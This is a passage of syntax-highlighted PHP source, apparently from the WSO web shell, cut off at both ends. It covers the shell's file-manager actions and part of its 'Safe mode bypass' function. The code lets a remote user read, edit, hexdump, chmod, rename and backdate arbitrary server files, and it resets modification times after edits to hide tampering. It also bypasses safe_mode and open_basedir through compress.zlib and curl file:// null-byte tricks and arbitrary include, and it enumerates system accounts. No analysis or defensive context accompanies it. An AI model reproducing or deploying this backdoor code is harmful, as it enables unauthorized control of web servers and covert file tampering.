    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;span&amp;gt;Create time:&amp;lt;/span&amp;gt; &#39;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">,</span><span class="nb">filectime</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span><span class="o">.</span><span class="s1">&#39; &amp;lt;span&amp;gt;Access time:&amp;lt;/span&amp;gt; &#39;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">,</span><span class="nb">fileatime</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span><span class="o">.</span><span class="s1">&#39; &amp;lt;span&amp;gt;Modify time:&amp;lt;/span&amp;gt; &#39;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">,</span><span class="nb">filemtime</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span><span class="o">.</span><span class="s1">&#39;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&#39;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span> <span class="p">)</span>
        <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;view&#39;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span> <span class="nb">is_file</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="p">)</span>
        <span class="nv">$m</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;View&#39;</span><span class="p">,</span> <span class="s1">&#39;Highlight&#39;</span><span class="p">,</span> <span class="s1">&#39;Download&#39;</span><span class="p">,</span> <span class="s1">&#39;Hexdump&#39;</span><span class="p">,</span> <span class="s1">&#39;Edit&#39;</span><span class="p">,</span> <span class="s1">&#39;Chmod&#39;</span><span class="p">,</span> <span class="s1">&#39;Rename&#39;</span><span class="p">,</span> <span class="s1">&#39;Touch&#39;</span><span class="p">);</span>
    <span class="k">else</span>
        <span class="nv">$m</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;Chmod&#39;</span><span class="p">,</span> <span class="s1">&#39;Rename&#39;</span><span class="p">,</span> <span class="s1">&#39;Touch&#39;</span><span class="p">);</span>
    <span class="k">foreach</span><span class="p">(</span><span class="nv">$m</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span>
        <span class="k">echo</span> <span class="s1">&#39;&amp;lt;a href=# onclick=&quot;g(null,null,null,\&#39;&#39;</span><span class="o">.</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;\&#39;)&quot;&amp;gt;&#39;</span><span class="o">.</span><span class="p">((</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">==@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span><span class="o">?</span><span class="s1">&#39;&amp;lt;b&amp;gt;[ &#39;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s1">&#39; ]&amp;lt;/b&amp;gt;&#39;</span><span class="o">:</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/a&amp;gt; &#39;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&#39;</span><span class="p">;</span>
    <span class="k">switch</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span> <span class="p">{</span>
        <span class="k">case</span> <span class="s1">&#39;view&#39;</span><span class="o">:</span>
            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;pre class=ml1&amp;gt;&#39;</span><span class="p">;</span>
            <span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="s1">&#39;r&#39;</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">while</span><span class="p">(</span> <span class="o">!@</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">)</span>
                    <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="o">@</span><span class="nb">fread</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="mi">1024</span><span class="p">));</span>
                <span class="o">@</span><span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/pre&amp;gt;&#39;</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="s1">&#39;highlight&#39;</span><span class="o">:</span>
            <span class="k">if</span><span class="p">(</span> <span class="o">@</span><span class="nb">is_readable</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
                <span class="k">echo</span> <span class="s1">&#39;&amp;lt;div class=ml1 style=&quot;background-color: #e1e1e1;color:black;&quot;&amp;gt;&#39;</span><span class="p">;</span>
                <span class="nv">$code</span> <span class="o">=</span> <span class="o">@</span><span class="nb">highlight_file</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span><span class="k">true</span><span class="p">);</span>
                <span class="k">echo</span> <span class="nb">str_replace</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;&amp;lt;span &#39;</span><span class="p">,</span><span class="s1">&#39;&amp;lt;/span&amp;gt;&#39;</span><span class="p">),</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;&amp;lt;font &#39;</span><span class="p">,</span><span class="s1">&#39;&amp;lt;/font&amp;gt;&#39;</span><span class="p">),</span><span class="nv">$code</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/div&amp;gt;&#39;</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="s1">&#39;chmod&#39;</span><span class="o">:</span>
            <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
                <span class="nv">$perms</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="o">--</span><span class="nv">$i</span><span class="p">)</span>
                    <span class="nv">$perms</span> <span class="o">+=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">][</span><span class="nv">$i</span><span class="p">]</span><span class="o">*</span><span class="nb">pow</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span><span class="o">-</span><span class="nv">$i</span><span class="o">-</span><span class="mi">1</span><span class="p">));</span>
                <span class="k">if</span><span class="p">(</span><span class="o">!@</span><span class="nb">chmod</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="nv">$perms</span><span class="p">))</span>
                    <span class="k">echo</span> <span class="s1">&#39;Can\&#39;t set permissions!&amp;lt;br&amp;gt;&amp;lt;script&amp;gt;document.mf.p3.value=&quot;&quot;;&amp;lt;/script&amp;gt;&#39;</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="nb">clearstatcache</span><span class="p">();</span>
            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;script&amp;gt;p3_=&quot;&quot;;&amp;lt;/script&amp;gt;&amp;lt;form onsubmit=&quot;g(null,null,null,null,this.chmod.value);return false;&quot;&amp;gt;&amp;lt;input type=text name=chmod value=&quot;&#39;</span><span class="o">.</span><span class="nb">substr</span><span class="p">(</span><span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;%o&#39;</span><span class="p">,</span> <span class="nb">fileperms</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])),</span><span class="o">-</span><span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&quot;&amp;gt;&amp;lt;input type=submit value=&quot;&amp;gt;&amp;gt;&quot;&amp;gt;&amp;lt;/form&amp;gt;&#39;</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="s1">&#39;edit&#39;</span><span class="o">:</span>
            <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="nb">is_writable</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span>
                <span class="k">echo</span> <span class="s1">&#39;File isn\&#39;t writeable&#39;</span><span class="p">;</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
                <span class="nv">$time</span> <span class="o">=</span> <span class="o">@</span><span class="nb">filemtime</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span>
                <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">],</span><span class="mi">1</span><span class="p">);</span>
                <span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
                <span class="k">if</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span>
                    <span class="o">@</span><span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]);</span>
                    <span class="o">@</span><span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
                    <span class="k">echo</span> <span class="s1">&#39;Saved!&amp;lt;br&amp;gt;&amp;lt;script&amp;gt;p3_=&quot;&quot;;&amp;lt;/script&amp;gt;&#39;</span><span class="p">;</span>
                    <span class="o">@</span><span class="nb">touch</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span><span class="nv">$time</span><span class="p">,</span><span class="nv">$time</span><span class="p">);</span>
                <span class="p">}</span>
            <span class="p">}</span>
            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;form onsubmit=&quot;g(null,null,null,null,\&#39;1\&#39;+this.text.value);return false;&quot;&amp;gt;&amp;lt;textarea name=text class=bigarea&amp;gt;&#39;</span><span class="p">;</span>
            <span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="s1">&#39;r&#39;</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">while</span><span class="p">(</span> <span class="o">!@</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">)</span>
                    <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="o">@</span><span class="nb">fread</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="mi">1024</span><span class="p">));</span>
                <span class="o">@</span><span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/textarea&amp;gt;&amp;lt;input type=submit value=&quot;&amp;gt;&amp;gt;&quot;&amp;gt;&amp;lt;/form&amp;gt;&#39;</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="s1">&#39;hexdump&#39;</span><span class="o">:</span>
            <span class="nv">$c</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span>
            <span class="nv">$n</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
            <span class="nv">$h</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;00000000&amp;lt;br&amp;gt;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
            <span class="nv">$len</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
            <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nv">$len</span><span class="p">;</span> <span class="o">++</span><span class="nv">$i</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$h</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">.=</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;X&#39;</span><span class="p">,</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$c</span><span class="p">[</span><span class="nv">$i</span><span class="p">]))</span><span class="o">.</span><span class="s1">&#39; &#39;</span><span class="p">;</span>
                <span class="k">switch</span> <span class="p">(</span> <span class="nb">ord</span><span class="p">(</span><span class="nv">$c</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
                    <span class="k">case</span> <span class="mi">0</span><span class="o">:</span>  <span class="nv">$h</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">.=</span> <span class="s1">&#39; &#39;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="mi">9</span><span class="o">:</span>  <span class="nv">$h</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">.=</span> <span class="s1">&#39; &#39;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="mi">10</span><span class="o">:</span> <span class="nv">$h</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">.=</span> <span class="s1">&#39; &#39;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
                    <span class="k">case</span> <span class="mi">13</span><span class="o">:</span> <span class="nv">$h</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">.=</span> <span class="s1">&#39; &#39;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
                    <span class="k">default</span><span class="o">:</span> <span class="nv">$h</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">.=</span> <span class="nv">$c</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span> <span class="k">break</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="nv">$n</span><span class="o">++</span><span class="p">;</span>
                <span class="k">if</span> <span class="p">(</span><span class="nv">$n</span> <span class="o">==</span> <span class="mi">32</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$n</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                    <span class="k">if</span> <span class="p">(</span><span class="nv">$i</span><span class="o">+</span><span class="mi">1</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="nv">$len</span><span class="p">)</span> <span class="p">{</span><span class="nv">$h</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">.=</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;X&#39;</span><span class="p">,</span><span class="nv">$i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;lt;br&amp;gt;&#39;</span><span class="p">;}</span>
                    <span class="nv">$h</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">.=</span> <span class="s1">&#39;&amp;lt;br&amp;gt;&#39;</span><span class="p">;</span>
                    <span class="nv">$h</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;table cellspacing=1 cellpadding=5 bgcolor=#222222&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td bgcolor=#333333&amp;gt;&amp;lt;span style=&quot;font-weight: normal;&quot;&amp;gt;&amp;lt;pre&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$h</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/pre&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td bgcolor=#282828&amp;gt;&amp;lt;pre&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$h</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/pre&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td bgcolor=#333333&amp;gt;&amp;lt;pre&amp;gt;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$h</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/pre&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&#39;</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="s1">&#39;rename&#39;</span><span class="o">:</span>
            <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
                <span class="k">if</span><span class="p">(</span><span class="o">!@</span><span class="nb">rename</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]))</span>
                    <span class="k">echo</span> <span class="s1">&#39;Can\&#39;t rename!&amp;lt;br&amp;gt;&#39;</span><span class="p">;</span>
                <span class="k">else</span>
                    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;&amp;lt;script&amp;gt;g(null,null,&quot;&#39;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&quot;,null,&quot;&quot;)&amp;lt;/script&amp;gt;&#39;</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;form onsubmit=&quot;g(null,null,null,null,this.name.value);return false;&quot;&amp;gt;&amp;lt;input type=text name=name value=&quot;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&quot;&amp;gt;&amp;lt;input type=submit value=&quot;&amp;gt;&amp;gt;&quot;&amp;gt;&amp;lt;/form&amp;gt;&#39;</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="s1">&#39;touch&#39;</span><span class="o">:</span>
            <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
                <span class="nv">$time</span> <span class="o">=</span> <span class="nb">strtotime</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]);</span>
                <span class="k">if</span><span class="p">(</span><span class="nv">$time</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">touch</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span><span class="nv">$time</span><span class="p">,</span><span class="nv">$time</span><span class="p">))</span>
                        <span class="k">echo</span> <span class="s1">&#39;Fail!&#39;</span><span class="p">;</span>
                    <span class="k">else</span>
                        <span class="k">echo</span> <span class="s1">&#39;Touched!&#39;</span><span class="p">;</span>
                <span class="p">}</span> <span class="k">else</span> <span class="k">echo</span> <span class="s1">&#39;Bad time format!&#39;</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="nb">clearstatcache</span><span class="p">();</span>
            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;script&amp;gt;p3_=&quot;&quot;;&amp;lt;/script&amp;gt;&amp;lt;form onsubmit=&quot;g(null,null,null,null,this.touch.value);return false;&quot;&amp;gt;&amp;lt;input type=text name=touch value=&quot;&#39;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;Y-m-d H:i:s&quot;</span><span class="p">,</span> <span class="o">@</span><span class="nb">filemtime</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span><span class="o">.</span><span class="s1">&#39;&quot;&amp;gt;&amp;lt;input type=submit value=&quot;&amp;gt;&amp;gt;&quot;&amp;gt;&amp;lt;/form&amp;gt;&#39;</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/div&amp;gt;&#39;</span><span class="p">;</span>
    <span class="nx">wsoFooter</span><span class="p">();</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">actionSafeMode</span><span class="p">()</span> <span class="p">{</span>
    <span class="nv">$temp</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
    <span class="nb">ob_start</span><span class="p">();</span>
    <span class="k">switch</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="p">{</span>
        <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
            <span class="nv">$temp</span><span class="o">=@</span><span class="nb">tempnam</span><span class="p">(</span><span class="nv">$test</span><span class="p">,</span> <span class="s1">&#39;cx&#39;</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">copy</span><span class="p">(</span><span class="s2">&quot;compress.zlib://&quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">],</span> <span class="nv">$temp</span><span class="p">)){</span>
                <span class="k">echo</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$temp</span><span class="p">);</span>
                <span class="nb">unlink</span><span class="p">(</span><span class="nv">$temp</span><span class="p">);</span>
            <span class="p">}</span> <span class="k">else</span>
                <span class="k">echo</span> <span class="s1">&#39;Sorry... Can\&#39;t open file&#39;</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
            <span class="nv">$files</span> <span class="o">=</span> <span class="nb">glob</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;*&#39;</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span> <span class="nb">is_array</span><span class="p">(</span><span class="nv">$files</span><span class="p">)</span> <span class="p">)</span>
                <span class="k">foreach</span> <span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$filename</span><span class="p">)</span>
                    <span class="k">echo</span> <span class="nv">$filename</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
            <span class="nv">$ch</span> <span class="o">=</span> <span class="nb">curl_init</span><span class="p">(</span><span class="s2">&quot;file://&quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">preg_replace</span><span class="p">(</span><span class="s1">&#39;!\(\d+\)\s.*!&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="k">__FILE__</span><span class="p">));</span>
            <span class="nb">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="mi">4</span><span class="o">:</span>
            <span class="nb">ini_restore</span><span class="p">(</span><span class="s2">&quot;safe_mode&quot;</span><span class="p">);</span>
            <span class="nb">ini_restore</span><span class="p">(</span><span class="s2">&quot;open_basedir&quot;</span><span class="p">);</span>
            <span class="k">include</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="mi">5</span><span class="o">:</span>
            <span class="k">for</span><span class="p">(;</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">];</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$uid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getpwuid</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]);</span>
                <span class="k">if</span> <span class="p">(</span><span class="nv">$uid</span><span class="p">)</span>
                    <span class="k">echo</span> <span class="nb">join</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">,</span><span class="nv">$uid</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nv">$temp</span> <span class="o">=</span> <span class="nb">ob_get_clean</span><span class="p">();</span>
    <span class="nx">wsoHeader</span><span class="p">();</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;h1&amp;gt;Safe mode bypass&amp;lt;/h1&amp;gt;&amp;lt;div class=content&amp;gt;&#39;</span><span class="p">;</span>
